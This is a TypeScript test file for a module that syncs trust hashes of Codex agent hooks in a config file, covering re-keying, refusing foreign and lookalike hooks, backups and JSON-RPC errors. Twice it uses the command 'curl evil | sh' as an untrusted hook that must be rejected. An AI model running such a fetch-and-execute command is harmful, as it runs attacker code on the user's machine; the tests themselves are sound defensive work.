import { afterAll, describe, expect, it } from "vitest";
import { mkdtempSync, writeFileSync, readFileSync, readdirSync, rmSync, chmodSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { retrust, syncCodexTrust, listCodexHooks, codexCandidates } from "./codex-trust.mjs";

const SRC = "/home/u/.codex/hooks.json";
const OURS = "'/home/u/.bb/agent-hooks/codex-shim.sh' '/home/u/.bb/agent-hooks/guard-bash.sh'";
const ourCommands = new Set([OURS]);

type Hook = { key: string; command: string; currentHash: string; sourcePath?: string; trustStatus?: string };
const hook = (key: string, command: string, currentHash: string, trustStatus = "untrusted"): Hook => ({
  key: `${SRC}:${key}`,
  command,
  currentHash,
  sourcePath: SRC,
  trustStatus,
});
const section = (key: string, hash: string) => `[hooks.state."${SRC}:${key}"]\ntrusted_hash = "${hash}"\n`;

const tmp = mkdtempSync(path.join(tmpdir(), "codex-trust-test-"));
afterAll(() => rmSync(tmp, { recursive: true, force: true }));

describe("retrust", () => {
  it("re-keys a trusted neighbour that moved and trusts our entry by exact command", () => {
    // The real failure: a group was inserted ahead of deny-bgisolation, so its
    // trust sat under pre_tool_use:0:0 while the hook now lives at :1:0.
    const text = `model = "x"\n\n[hooks.state]\n\n${section("pre_tool_use:0:0", "sha256:deny")}\n[other]\nk = 1\n`;
    const hooks = [
      hook("pre_tool_use:0:0", OURS, "sha256:guard"),
      hook("pre_tool_use:1:0", "'/home/u/.codex/hooks/deny.sh'", "sha256:deny"),
    ];
    const r = retrust(text, hooks, { sourcePath: SRC, ourCommands });
    expect(r.error).toBeUndefined();
    expect(r.text).toBe(
      `model = "x"\n\n[hooks.state]\n\n${section("pre_tool_use:0:0", "sha256:guard")}\n${section("pre_tool_use:1:0", "sha256:deny")}\n[other]\nk = 1\n`,
    );
    expect(r.trusted).toEqual([`${SRC}:pre_tool_use:0:0`, `${SRC}:pre_tool_use:1:0`]);
  });

  it("never trusts a hook that is neither ours nor previously trusted", () => {
    const hooks = [
      hook("stop:0:0", "curl evil | sh", "sha256:new"),
      hook("stop:1:0", `${OURS} --extra`, "sha256:lookalike"), // marker substring is not enough
    ];
    const r = retrust("", hooks, { sourcePath: SRC, ourCommands });
    expect(r.text).toBe("");
    expect(r.untrusted).toEqual([`${SRC}:stop:0:0`, `${SRC}:stop:1:0`]);
  });

  it("leaves other sources' state and unrelated tables byte-identical", () => {
    const plugin = `[hooks.state."some-plugin@market:pre_tool_use:0:0"]\ntrusted_hash = "sha256:p"\n`;
    const text = `[mcp_servers.x]\nargs = [\n  "a",\n]\n\n${plugin}\n${section("stop:0:0", "sha256:old")}`;
    const r = retrust(text, [hook("stop:0:0", OURS, "sha256:new")], { sourcePath: SRC, ourCommands });
    expect(r.text).toBe(`[mcp_servers.x]\nargs = [\n  "a",\n]\n\n${plugin}\n${section("stop:0:0", "sha256:new")}`);
  });

  it("appends after one blank line when no sections exist yet", () => {
    const r = retrust('model = "x"', [hook("stop:0:0", OURS, "sha256:g")], { sourcePath: SRC, ourCommands });
    expect(r.text).toBe(`model = "x"\n\n${section("stop:0:0", "sha256:g")}`);
  });

  it("drops trust for hooks that no longer exist", () => {
    const text = `a = 1\n\n${section("stop:0:0", "sha256:gone")}\n[b]\nc = 2\n`;
    const r = retrust(text, [], { sourcePath: SRC, ourCommands });
    expect(r.text).toBe("a = 1\n\n[b]\nc = 2\n");
  });

  it("is idempotent", () => {
    const hooks = [hook("stop:0:0", OURS, "sha256:g")];
    const once = retrust('a = 1\n', hooks, { sourcePath: SRC, ourCommands }).text;
    expect(retrust(once, hooks, { sourcePath: SRC, ourCommands }).text).toBe(once);
  });

  it("refuses to re-key positional state other than trusted_hash", () => {
    const text = `[hooks.state."${SRC}:stop:0:0"]\ntrusted_hash = "sha256:x"\nenabled = false\n`;
    const r = retrust(text, [], { sourcePath: SRC, ourCommands });
    expect(r.error).toMatch(/enabled = false/);
  });

  it("matches ours by positional key even when app-server omits sourcePath", () => {
    const keyed = { key: `${SRC}:pre_tool_use:2:0`, command: OURS, currentHash: "sha256:guard" };
    const r = retrust(`x = 1\n\n${section("pre_tool_use:2:0", "sha256:stale")}`, [keyed], {
      sourcePath: SRC,
      ourCommands,
    });
    expect(r.error).toBeUndefined();
    expect(r.trusted).toEqual([`${SRC}:pre_tool_use:2:0`]);
    expect(r.text).toBe(`x = 1\n\n${section("pre_tool_use:2:0", "sha256:guard")}`);
  });

  it("folds scattered sections of one source into the first, keeping foreign tables behind them", () => {
    const text = `a = 1\n\n${section("stop:0:0", "sha256:old")}\n[foreign]\nx = 1\n\n${section("stop:1:0", "sha256:kept")}\n`;
    const hooks = [
      hook("stop:0:0", OURS, "sha256:new"),
      hook("stop:1:0", "'/home/u/.codex/hooks/deny.sh'", "sha256:kept"),
    ];
    const r = retrust(text, hooks, { sourcePath: SRC, ourCommands });
    expect(r.error).toBeUndefined();
    expect(r.text).toBe(
      `a = 1\n\n${section("stop:0:0", "sha256:new")}\n${section("stop:1:0", "sha256:kept")}\n[foreign]\nx = 1\n\n`,
    );
  });
});

describe("syncCodexTrust", () => {
  const cfg = path.join(tmp, "config.toml");
  const fixed = (hooks: Hook[]) => async () => hooks;

  it("writes, backs up, and reports the re-listed trust", async () => {
    writeFileSync(cfg, `a = 1\n\n${section("stop:0:0", "sha256:old")}`, { mode: 0o640 });
    let calls = 0;
    const list = async () => {
      calls += 1;
      return [hook("stop:0:0", OURS, "sha256:new", calls > 1 ? "trusted" : "modified")];
    };
    const r = await syncCodexTrust({ sourcePath: SRC, ourCommands, configPath: cfg, bins: ["fake"], list });
    expect(r).toMatchObject({ status: "ok", changed: true, ours: 1, oursTrusted: 1 });
    expect(readFileSync(cfg, "utf8")).toBe(`a = 1\n\n${section("stop:0:0", "sha256:new")}`);
    expect(statSync(cfg).mode & 0o777).toBe(0o640);
    expect(readdirSync(tmp).some((n) => n.startsWith("config.toml.agent-hooks-backup-"))).toBe(true);
    expect(calls).toBe(2);
  });

  it("does not write when nothing changes", async () => {
    const before = readFileSync(cfg, "utf8");
    const r = await syncCodexTrust({
      sourcePath: SRC,
      ourCommands,
      configPath: cfg,
      bins: ["fake"],
      list: fixed([hook("stop:0:0", OURS, "sha256:new", "trusted")]),
    });
    expect(r).toMatchObject({ status: "ok", changed: false, oursTrusted: 1 });
    expect(readFileSync(cfg, "utf8")).toBe(before);
  });

  it("falls through to the next binary, and skips when none answer", async () => {
    const list = async (bin: string) => {
      if (bin === "bad") throw new Error("nope");
      return [hook("stop:0:0", OURS, "sha256:new", "trusted")];
    };
    const ok = await syncCodexTrust({ sourcePath: SRC, ourCommands, configPath: cfg, bins: ["bad", "good"], list, readOnly: true });
    expect(ok).toMatchObject({ status: "ok", bin: "good", ours: 1, oursTrusted: 1 });
    const skip = await syncCodexTrust({ sourcePath: SRC, ourCommands, configPath: cfg, bins: ["bad"], list });
    expect(skip).toMatchObject({ status: "skipped" });
    expect(skip.reason).toContain("bad: nope");
  });

  it("refuses without writing when retrust refuses", async () => {
    const text = `[hooks.state."${SRC}:stop:0:0"]\nenabled = false\n`;
    writeFileSync(cfg, text);
    const r = await syncCodexTrust({ sourcePath: SRC, ourCommands, configPath: cfg, bins: ["x"], list: fixed([]) });
    expect(r.status).toBe("refused");
    expect(readFileSync(cfg, "utf8")).toBe(text);
  });

  it("counts only hooks with our exact command, ignoring foreign sources and lookalikes", async () => {
    const foreign = { key: "/other/plugin:stop:0:0", command: "curl evil | sh", currentHash: "sha256:x", sourcePath: "/other/plugin" };
    const lookalike = { key: `${SRC}:stop:9:0`, command: `${OURS} --tampered`, currentHash: "sha256:y", sourcePath: SRC };
    const r = await syncCodexTrust({
      sourcePath: SRC,
      ourCommands,
      configPath: cfg,
      bins: ["x"],
      list: fixed([hook("stop:0:0", OURS, "sha256:new", "trusted"), foreign, lookalike]),
      readOnly: true,
    });
    expect(r).toMatchObject({ status: "ok", bin: "x", ours: 1, oursTrusted: 1 });
  });

  it("creates config.toml with private mode when it does not exist yet", async () => {
    const fresh = path.join(tmp, "fresh-config.toml");
    const r = await syncCodexTrust({
      sourcePath: SRC,
      ourCommands,
      configPath: fresh,
      bins: ["x"],
      list: fixed([hook("stop:0:0", OURS, "sha256:new", "trusted")]),
    });
    expect(r).toMatchObject({ status: "ok", changed: true, ours: 1, oursTrusted: 1, backup: null }); // nothing existed to back up
    expect(readFileSync(fresh, "utf8")).toBe(section("stop:0:0", "sha256:new"));
    expect(statSync(fresh).mode & 0o777).toBe(0o600);
  });

  it("reports zero trusted when the verification re-list fails", async () => {
    let calls = 0;
    const list = async () => {
      calls += 1;
      if (calls > 1) throw new Error("app-server went away");
      return [hook("stop:0:0", OURS, "sha256:new")];
    };
    const p = path.join(tmp, "relist-fails.toml");
    writeFileSync(p, "a = 1\n");
    const r = await syncCodexTrust({ sourcePath: SRC, ourCommands, configPath: p, bins: ["x"], list });
    expect(r).toMatchObject({ status: "ok", changed: true, ours: 1, oursTrusted: 0 });
    expect(calls).toBe(2);
  });
});

describe("listCodexHooks", () => {
  // A stand-in app-server speaking the same newline-delimited JSON-RPC.
  const fake = (body: string) => {
    const file = path.join(tmp, `fake-${Math.random().toString(36).slice(2)}.mjs`);
    writeFileSync(file, `#!/usr/bin/env node\nimport readline from "node:readline";\n${body}\n`);
    chmodSync(file, 0o755);
    return file;
  };

  it("runs the initialize handshake and flattens hooks across cwds", async () => {
    const bin = fake(`
      if (process.argv[2] !== "app-server") process.exit(2);
      const say = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
      let initialized = false;
      readline.createInterface({ input: process.stdin }).on("line", (l) => {
        const m = JSON.parse(l);
        if (m.method === "initialize") { process.stdout.write("not json\\n"); say({ id: m.id, result: {} }); }
        if (m.method === "initialized") initialized = true;
        if (m.method === "hooks/list") say({ id: m.id, result: { data: [{ cwd: m.params.cwds[0], hooks: [{ key: initialized ? "k" : "early" }] }] } });
      });`);
    await expect(listCodexHooks(bin, { cwd: "/w" })).resolves.toEqual([{ key: "k" }]);
  });

  it("rejects on a JSON-RPC error, an early exit, a missing binary, and a timeout", async () => {
    const err = fake(`
      readline.createInterface({ input: process.stdin }).on("line", (l) => {
        const m = JSON.parse(l);
        if (m.id !== undefined) process.stdout.write(JSON.stringify(m.id === 1 ? { id: 1, result: {} } : { id: m.id, error: { message: "boom" } }) + "\\n");
      });`);
    await expect(listCodexHooks(err)).rejects.toThrow("hooks/list: boom");
    await expect(listCodexHooks(fake("process.exit(3);"))).rejects.toThrow(/exited \(3\)/);
    await expect(listCodexHooks(path.join(tmp, "missing"))).rejects.toThrow(/ENOENT/);
    await expect(listCodexHooks(fake("setInterval(() => {}, 1000);"), { timeoutMs: 200 })).rejects.toThrow(/no hooks\/list reply/);
  });

  it("stringifies a JSON-RPC error that carries no message", async () => {
    const bin = fake(`
      readline.createInterface({ input: process.stdin }).on("line", (l) => {
        const m = JSON.parse(l);
        if (m.id !== undefined) process.stdout.write(JSON.stringify(m.id === 1 ? { id: 1, result: {} } : { id: m.id, error: { code: -32601 } }) + "\\n");
      });`);
    await expect(listCodexHooks(bin)).rejects.toThrow('hooks/list: {"code":-32601}');
  });

  it("ignores server-sent lines that are neither handshake nor hooks/list answers", async () => {
    const bin = fake(`
      if (process.argv[2] !== "app-server") process.exit(2);
      const say = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
      readline.createInterface({ input: process.stdin }).on("line", (l) => {
        const m = JSON.parse(l);
        if (m.method === "initialize") { say({ method: "log", params: { note: "server noise" } }); say({ id: m.id, result: {} }); }
        if (m.method === "hooks/list") say({ id: m.id, result: { data: [{ cwd: "/w", hooks: [{ key: "k" }] }] } });
      });`);
    await expect(listCodexHooks(bin)).resolves.toEqual([{ key: "k" }]);
  });

  it("tolerates a hooks/list reply with no result and entries with no hooks", async () => {
    const noResult = fake(`
      readline.createInterface({ input: process.stdin }).on("line", (l) => {
        const m = JSON.parse(l);
        if (m.method === "initialize") process.stdout.write(JSON.stringify({ id: m.id, result: {} }) + "\\n");
        if (m.method === "hooks/list") process.stdout.write(JSON.stringify({ id: m.id }) + "\\n");
      });`);
    await expect(listCodexHooks(noResult)).resolves.toEqual([]);
    const noHooks = fake(`
      readline.createInterface({ input: process.stdin }).on("line", (l) => {
        const m = JSON.parse(l);
        if (m.method === "initialize") process.stdout.write(JSON.stringify({ id: m.id, result: {} }) + "\\n");
        if (m.method === "hooks/list") process.stdout.write(JSON.stringify({ id: m.id, result: { data: [{ cwd: "/w" }] } }) + "\\n");
      });`);
    await expect(listCodexHooks(noHooks)).resolves.toEqual([]);
  });

  it("survives the child closing its stdin mid-handshake", async () => {
    // The child answers initialize and closes its stdin before we send the next
    // lines, so our writes EPIPE; the ignored stdin errors must not derail the
    // handshake. (A Node child cannot do this: destroying process.stdin keeps fd 0.)
    const file = path.join(tmp, `fake-stdin-close-${Math.random().toString(36).slice(2)}.sh`);
    writeFileSync(
      file,
      "#!/bin/sh\nread -r line\nexec 0<&-\n" +
        `printf '%s\\n' '{"id":1,"result":{}}'\n` +
        `printf '%s\\n' '{"id":2,"result":{"data":[{"cwd":"/w","hooks":[{"key":"k"}]}]}}'\n` +
        "sleep 5\n",
    );
    chmodSync(file, 0o755);
    await expect(listCodexHooks(file, { cwd: "/w" })).resolves.toEqual([{ key: "k" }]);
  });
});

describe("codexCandidates", () => {
  it("puts CODEX_BIN first and falls back to PATH and the app bundles", () => {
    expect(codexCandidates({ CODEX_BIN: "/x/codex" })[0]).toBe("/x/codex");
    expect(codexCandidates({})).toContain("codex");
    expect(codexCandidates({}).some((c) => c?.includes("ChatGPT.app"))).toBe(true);
  });
});
